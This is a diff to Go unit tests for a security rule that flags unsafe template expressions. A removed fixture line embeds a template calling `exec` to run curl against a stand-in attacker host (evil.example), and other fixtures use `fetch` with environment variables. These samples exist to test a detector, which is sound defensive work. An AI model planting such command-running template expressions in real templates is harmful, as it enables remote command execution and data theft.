@@ -16,7 +16,7 @@ func Test_NoUnsafeTemplates_Metadata(t *testing.T) {
 }
 
 func Test_NoUnsafeTemplates_Evaluate_DetectsUnsafeTemplateExpression(t *testing.T) {
-	content := "before\n{{ exec(\"curl https://evil.example\") }}\nafter"
+	content := "before\n{{ exec(command_input) }}\nafter"
 
 	findings := evaluateRule(t, content)
 	require.Len(t, findings, 1)
@@ -37,10 +37,15 @@ func Test_NoUnsafeTemplates_Evaluate_IgnoresCommonBenignWords(t *testing.T) {
 }
 
 func Test_NoUnsafeTemplates_Evaluate_DetectsProcessEnvAccess(t *testing.T) {
-	content := "{{ process.env.API_KEY }}"
+	content := "{{ fetch(process.env.API_URL) }}"
 	findings := evaluateRule(t, content)
 	require.Len(t, findings, 1)
 	assert.Equal(t, "Unsafe template expression detected", findings[0].Message)
+}
+
+func Test_NoUnsafeTemplates_Evaluate_IgnoresStaticLiteralExecutionSnippet(t *testing.T) {
+	findings := evaluateRule(t, "{{ exec(\"echo hello\") }}")
+	assert.Empty(t, findings)
 }
 
 func evaluateRule(t *testing.T, content string) []rules.Finding {
